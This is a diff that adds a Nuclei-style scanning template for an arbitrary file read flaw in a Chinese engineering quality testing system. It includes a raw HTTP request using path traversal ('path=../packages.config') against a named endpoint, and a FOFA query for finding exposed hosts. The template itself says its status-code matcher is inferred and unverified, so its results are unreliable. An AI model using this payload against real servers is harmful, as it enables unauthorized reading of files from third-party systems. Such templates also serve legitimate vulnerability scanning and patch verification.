@@ -1,0 +1,27 @@
+id: poc-vm3zhutc6s7qdatw
+info:
+  name: 湖南建研工程质量检测系统-任意文件读取
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vm3zhutc6s7qdatw
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vm3zhutc6s7qdatw
+    fofa: FOFA：body="/Content/Theme/Standard/webSite/login.css"
+http:
+- raw:
+  - 'GET /Applications/Forms/Custom/InstrumentUsageRecordExport.cshtml?act=down&path=../packages.config HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Content-Length: 0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
